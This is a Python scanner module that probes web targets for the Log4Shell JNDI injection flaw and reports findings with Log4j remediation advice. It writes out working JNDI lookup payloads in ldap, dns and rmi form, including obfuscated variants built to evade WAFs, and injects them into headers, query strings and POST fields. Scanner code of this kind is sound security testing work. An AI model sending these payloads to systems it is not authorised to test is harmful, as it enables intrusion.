"""
Log4Shell (CVE-2021-44228) JNDI Injection Tester Module for Deep Eye.

Tests for Log4j JNDI lookup injection via headers, query params, and POST body.
"""

import uuid
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)


class Log4ShellTester:
    """Tests for Log4Shell JNDI injection vulnerabilities."""

    # Headers commonly logged by Java applications
    INJECTION_HEADERS = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "X-Api-Version",
        "Accept-Language",
        "X-Request-Id",
        "Authorization",
        "X-Forwarded-Host",
        "X-Client-IP",
        "CF-Connecting-IP",
    ]

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.timeout = config.get("scanner", {}).get("timeout", 10)
        self.callback_domain = config.get("advanced", {}).get(
            "oob_callback_domain", "deepeye.oob.local"
        )

    def _generate_payloads(self, identifier: str) -> List[Dict]:
        """Generate JNDI payloads including obfuscated variants."""
        base_domain = f"{identifier}.{self.callback_domain}"

        payloads = [
            # Standard JNDI lookups
            {
                "payload": f"${{jndi:ldap://{base_domain}/a}}",
                "variant": "standard_ldap",
            },
            {
                "payload": f"${{jndi:dns://{base_domain}}}",
                "variant": "standard_dns",
            },
            {
                "payload": f"${{jndi:rmi://{base_domain}/a}}",
                "variant": "standard_rmi",
            },
            # Obfuscated variants to bypass WAF
            {
                "payload": f"${{${{lower:j}}ndi:ldap://{base_domain}/a}}",
                "variant": "lower_j",
            },
            {
                "payload": f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:ldap://{base_domain}/a}}",
                "variant": "lower_all",
            },
            {
                "payload": f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{base_domain}/a}}",
                "variant": "reverse_index",
            },
            {
                "payload": f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap://{base_domain}/a}}",
                "variant": "env_bypass",
            },
            {
                "payload": f"${{${{lower:j}}${{upper:N}}${{lower:d}}${{upper:I}}:ldap://{base_domain}/a}}",
                "variant": "mixed_case",
            },
            {
                "payload": f"${{j${{::-n}}di:ldap://{base_domain}/a}}",
                "variant": "partial_reverse",
            },
        ]
        return payloads

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for Log4Shell JNDI injection vulnerabilities.

        Args:
            url: Target URL to test.
            context: Optional context dictionary.

        Returns:
            List of vulnerability dictionaries.
        """
        vulnerabilities = []
        context = context or {}

        logger.info(f"[Log4Shell] Testing: {url}")

        # Test via HTTP headers
        vulns = self._test_headers(url)
        vulnerabilities.extend(vulns)

        # Test via query parameters
        vulns = self._test_query_params(url)
        vulnerabilities.extend(vulns)

        # Test via POST body
        vulns = self._test_post_body(url)
        vulnerabilities.extend(vulns)

        logger.info(f"[Log4Shell] Found {len(vulnerabilities)} potential issues on {url}")
        return vulnerabilities

    def _test_headers(self, url: str) -> List[Dict]:
        """Inject JNDI payloads into HTTP headers."""
        vulnerabilities = []

        for header_name in self.INJECTION_HEADERS:
            identifier = f"h-{header_name[:4].lower()}-{uuid.uuid4().hex[:8]}"
            payloads = self._generate_payloads(identifier)

            for payload_info in payloads:
                payload = payload_info["payload"]
                variant = payload_info["variant"]

                headers = {header_name: payload}
                result = self._send_and_detect(url, headers=headers)

                if result:
                    vulnerabilities.append({
                        "type": "log4shell_jndi_injection",
                        "severity": "critical",
                        "url": url,
                        "parameter": f"Header: {header_name}",
                        "payload": payload,
                        "evidence": result,
                        "description": (
                            f"Potential Log4Shell (CVE-2021-44228) vulnerability detected. "
                            f"JNDI injection payload in '{header_name}' header triggered an "
                            f"anomalous response. Variant: {variant}. "
                            f"Full confirmation requires an out-of-band callback server."
                        ),
                        "remediation": (
                            "Upgrade Log4j to version 2.17.1 or later. As immediate mitigation: "
                            "set log4j2.formatMsgNoLookups=true, remove JndiLookup class from classpath, "
                            "or restrict outbound network connections from the application server."
                        ),
                    })
                    # One finding per header is sufficient
                    break

        return vulnerabilities

    def _test_query_params(self, url: str) -> List[Dict]:
        """Inject JNDI payloads into query parameters."""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # If no params exist, try injecting a common one
        test_params = list(params.keys()) if params else ["q", "search", "id", "name"]

        for param_name in test_params:
            identifier = f"q-{param_name[:4]}-{uuid.uuid4().hex[:8]}"
            payloads = self._generate_payloads(identifier)

            for payload_info in payloads[:3]:  # Test top 3 variants per param
                payload = payload_info["payload"]
                variant = payload_info["variant"]

                injected_url = self._inject_param(url, param_name, payload)
                result = self._send_and_detect(injected_url)

                if result:
                    vulnerabilities.append({
                        "type": "log4shell_jndi_injection",
                        "severity": "critical",
                        "url": url,
                        "parameter": f"Query: {param_name}",
                        "payload": payload,
                        "evidence": result,
                        "description": (
                            f"Potential Log4Shell vulnerability via query parameter '{param_name}'. "
                            f"JNDI lookup payload ({variant}) caused anomalous server behavior. "
                            f"Confirm with OOB callback server."
                        ),
                        "remediation": (
                            "Upgrade Log4j to 2.17.1+. Set log4j2.formatMsgNoLookups=true. "
                            "Remove JndiLookup.class from the classpath. Block outbound LDAP/RMI traffic."
                        ),
                    })
                    break

        return vulnerabilities

    def _test_post_body(self, url: str) -> List[Dict]:
        """Inject JNDI payloads into POST request body."""
        vulnerabilities = []
        identifier = f"body-{uuid.uuid4().hex[:8]}"
        payloads = self._generate_payloads(identifier)

        common_fields = ["username", "email", "search", "query", "data", "input"]

        for field in common_fields:
            for payload_info in payloads[:2]:  # Top 2 variants per field
                payload = payload_info["payload"]
                variant = payload_info["variant"]

                # Test as form data
                form_data = {field: payload}
                result = self._send_and_detect(url, method="POST", data=form_data)

                if result:
                    vulnerabilities.append({
                        "type": "log4shell_jndi_injection",
                        "severity": "critical",
                        "url": url,
                        "parameter": f"POST body field: {field}",
                        "payload": payload,
                        "evidence": result,
                        "description": (
                            f"Potential Log4Shell vulnerability via POST body field '{field}'. "
                            f"JNDI payload ({variant}) triggered anomalous response."
                        ),
                        "remediation": (
                            "Upgrade Log4j to 2.17.1+. Apply JVM flag -Dlog4j2.formatMsgNoLookups=true. "
                            "Remove the JndiLookup class. Implement WAF rules to block JNDI patterns."
                        ),
                    })
                    break

        return vulnerabilities

    def _send_and_detect(
        self,
        url: str,
        headers: Optional[Dict] = None,
        method: str = "GET",
        data: Optional[Dict] = None,
    ) -> Optional[str]:
        """Send request with JNDI payload and detect indicators."""
        try:
            if method == "GET":
                response = self.http_client.get(url, headers=headers, timeout=self.timeout)
            else:
                response = self.http_client.post(
                    url, data=data, headers=headers, timeout=self.timeout
                )

            if response is None:
                return None

            return self._analyze_response(response)

        except Exception as e:
            # Connection errors after JNDI injection can indicate the server
            # attempted an outbound connection
            error_str = str(e).lower()
            if "timeout" in error_str or "connection" in error_str:
                return f"Connection anomaly after JNDI injection: {str(e)[:100]}"
            logger.debug(f"[Log4Shell] Request error: {e}")
            return None

    def _analyze_response(self, response) -> Optional[str]:
        """Analyze response for Log4Shell indicators."""
        indicators = []

        # Server error triggered by JNDI lookup attempt
        if response.status_code == 500:
            indicators.append("500 Internal Server Error (possible failed JNDI lookup)")

        # Check for Java/Log4j error traces
        text = response.text.lower()
        java_errors = [
            "javax.naming",
            "jndi",
            "log4j",
            "lookup",
            "initialcontext",
            "classnotfoundexception",
            "java.lang.runtime",
            "naming.namingexception",
            "connection refused",
        ]
        for error in java_errors:
            if error in text:
                indicators.append(f"Java/JNDI error indicator: '{error}'")

        # WAF block can also indicate the payload was recognized
        if response.status_code == 403 and "blocked" in text:
            # WAF blocked it - not a vuln but worth noting
            return None

        if indicators:
            return "; ".join(indicators)
        return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into a URL query parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
